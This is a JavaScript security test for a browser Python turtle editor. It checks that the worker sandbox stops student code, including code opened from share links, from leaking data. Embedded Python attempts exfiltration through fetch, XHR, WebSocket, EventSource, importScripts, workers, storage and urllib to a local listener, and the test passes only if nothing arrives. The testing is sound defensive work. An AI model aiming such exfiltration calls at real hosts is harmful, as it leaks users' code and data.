/**
 * Security verification — can student Python reach off the machine?
 *
 *   node test/security.browser.mjs
 *
 * This suite exists because `BRIEF.md` makes a promise to Technology Services:
 * student code is never transmitted anywhere. That promise was NOT true before
 * the worker sandbox existed -- a one-line Python program could post the whole
 * source to the server, and the request arrived.
 *
 * Everything here is measured by whether a request PHYSICALLY ARRIVES at a
 * listening server, not by reading console messages or catching exceptions. An
 * exception proves the attempt failed; only a silent listener proves nothing
 * left the machine.
 */

import { spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const APP_PORT = 8132;
const LISTEN_PORT = 8133;
const BASE = `http://127.0.0.1:${APP_PORT}`;

let passed = 0;
let failed = 0;
const check = (name, ok, detail = '') => {
  if (ok) { passed++; console.log(`  ok   ${name}`); }
  else { failed++; console.log(`  FAIL ${name}${detail ? `\n         ${detail}` : ''}`); }
};

/** Anything that arrives here escaped the sandbox. */
const escaped = [];
const listener = createServer((req, res) => {
  escaped.push(`cross-origin ${req.url}`);
  res.writeHead(200, { 'access-control-allow-origin': '*' }).end('ok');
});
await new Promise((r) => listener.listen(LISTEN_PORT, '127.0.0.1', r));

// The app server records any request carrying a query string: a plain page load
// never has one, so anything with `?leak=` came from student code.
const sameOrigin = [];
const server = spawn(process.execPath, [join(ROOT, 'serve.mjs')], {
  cwd: ROOT,
  env: { ...process.env, PORT: String(APP_PORT) },
  stdio: ['ignore', 'pipe', 'pipe'],
});
await new Promise((res) => server.stdout.on('data', (d) => String(d).includes('http://') && res()));

const browser = await chromium.launch();
const page = await browser.newPage();
page.on('request', (req) => {
  const url = req.url();
  if (url.includes('leak=')) sameOrigin.push(url);
});

const run = async (code) => {
  await page.evaluate((c) => { window.__editor.value = c; }, code);
  await page.click('#run');
  await page.waitForFunction(
    () => !document.getElementById('run').disabled
      && document.getElementById('status').textContent !== 'Running',
    null, { timeout: 60000 },
  );
  // A program finishing and its drawing finishing are different events.
  await page.evaluate(() => window.__renderer.whenIdle());
  return page.textContent('.console-lines');
};

try {
  await page.goto(`${BASE}/?nosw`, { waitUntil: 'domcontentloaded' });
  await page.waitForSelector('body[data-ready="1"]', { timeout: 90000 });

  /* ------------------------------------------------- 1. the seal report */
  console.log('\n1. The worker reports what it sealed');
  const sealed = JSON.parse(await page.evaluate(() => document.body.dataset.sealed));
  check('worker reported a seal', sealed !== null, String(sealed));
  check('nothing failed to seal', sealed.failed.length === 0,
    `failed: ${sealed.failed.join(', ')}`);
  check('the network primitives were present and are now gone',
    ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource'].every((n) => sealed.removed.includes(n)),
    JSON.stringify(sealed));
  check('nested Worker removed (a fresh worker would have pristine globals)',
    sealed.removed.includes('Worker'), JSON.stringify(sealed.removed));
  check('storage removed (a shared program must not read saved work)',
    sealed.removed.includes('indexedDB') && sealed.removed.includes('caches'));
  console.log(`       removed: ${sealed.removed.join(', ')}`);
  if (sealed.absent.length) console.log(`       already absent: ${sealed.absent.join(', ')}`);

  /* ------------------------------------------ 2. every channel, measured */
  console.log('\n2. Exfiltration attempts — nothing may arrive anywhere');
  const target = `http://127.0.0.1:${LISTEN_PORT}/?leak=STUDENT-SOURCE`;

  const attempts = await run(`
import js

SAME = "/?leak=STUDENT-SOURCE"
CROSS = "${target}"

def attempt(label, fn):
    try:
        fn()
        print(label, "=> NO ERROR RAISED")
    except Exception as e:
        print(label, "=> blocked:", type(e).__name__)

attempt("fetch same-origin",  lambda: js.fetch(SAME))
attempt("fetch cross-origin", lambda: js.fetch(CROSS))

def xhr(url):
    x = js.XMLHttpRequest.new()
    x.open("GET", url, False)
    x.send()
attempt("xhr same-origin",  lambda: xhr(SAME))
attempt("xhr cross-origin", lambda: xhr(CROSS))

attempt("websocket",     lambda: js.WebSocket.new("ws://127.0.0.1:${LISTEN_PORT}/?leak=STUDENT-SOURCE"))
attempt("eventsource",   lambda: js.EventSource.new(CROSS))
attempt("importScripts", lambda: js.importScripts(CROSS))
attempt("nested worker", lambda: js.Worker.new(CROSS))
attempt("indexeddb",     lambda: js.indexedDB.open("turtle-editor"))
attempt("cache storage", lambda: js.caches.open("vendor-v1"))

import urllib.request
attempt("urllib", lambda: urllib.request.urlopen(CROSS))
`);

  const lines = attempts.split('\n').filter((l) => l.includes('=>'));
  console.log(lines.map((l) => `       ${l.trim()}`).join('\n'));

  check('every attempt raised rather than silently succeeding',
    !attempts.includes('NO ERROR RAISED'),
    lines.filter((l) => l.includes('NO ERROR')).join(' | '));

  // Give anything asynchronous a chance to actually go out before judging.
  await page.waitForTimeout(1500);

  check('NOTHING reached the cross-origin listener', escaped.length === 0,
    escaped.join('\n         '));
  check('NOTHING reached the app server either', sameOrigin.length === 0,
    sameOrigin.join('\n         '));

  /* ---------------------------------------- 3. a shared link is hostile */
  console.log('\n3. The same applies to a program arriving from a share link');
  // A share link is the realistic delivery route: a student opens a classmate's
  // link, and its code runs with exactly the same privileges as their own.
  const shareUrl = await page.evaluate(async (t) => {
    const { buildShareUrl } = await import('./src/storage/share.js');
    return buildShareUrl(
      `import js\ntry:\n    js.fetch("${t}")\nexcept Exception as e:\n    print("blocked", type(e).__name__)\n`,
      location.href.split('?')[0],
    );
  }, target);

  await page.goto(`${shareUrl}`, { waitUntil: 'domcontentloaded' });
  await page.waitForSelector('body[data-ready="1"]', { timeout: 90000 });
  await page.waitForFunction(() => !document.getElementById('banner').hidden, null, { timeout: 15000 });
  await page.click('#run');
  await page.waitForFunction(
    () => !document.getElementById('run').disabled
      && document.getElementById('status').textContent !== 'Running',
    null, { timeout: 60000 },
  );
  await page.waitForTimeout(1000);
  check('a shared program cannot phone home either', escaped.length === 0,
    escaped.join('\n         '));

  /* ------------------------------------------- 4. the app still works */
  console.log('\n4. The sandbox did not break the editor');
  await page.goto(`${BASE}/?nosw`, { waitUntil: 'domcontentloaded' });
  await page.waitForSelector('body[data-ready="1"]', { timeout: 90000 });
  const out = await run('import turtle\nt = turtle.Turtle()\nt.speed(0)\nfor i in range(4):\n    t.forward(80)\n    t.left(90)\nprint("drew ok")\n');
  check('turtle still runs', out.includes('drew ok'), out.slice(0, 150));
  check('and still draws',
    (await page.evaluate(() => window.__renderer.committed.filter((o) => o.op === 'line').length)) === 4);

  const stdlib = await run('import json, math, random, datetime\nprint("stdlib fine", json.dumps({"a": 1}), round(math.pi, 2))\n');
  check('the standard library still imports without the network',
    stdlib.includes('stdlib fine'), stdlib.slice(0, 150));
} catch (err) {
  failed++;
  console.log(`\n  FAIL (threw) ${err.message}\n${err.stack}`);
} finally {
  await browser.close();
  server.kill();
  listener.close();
}

console.log(`\n${passed} passed, ${failed} failed\n`);
process.exit(failed === 0 ? 0 : 1);
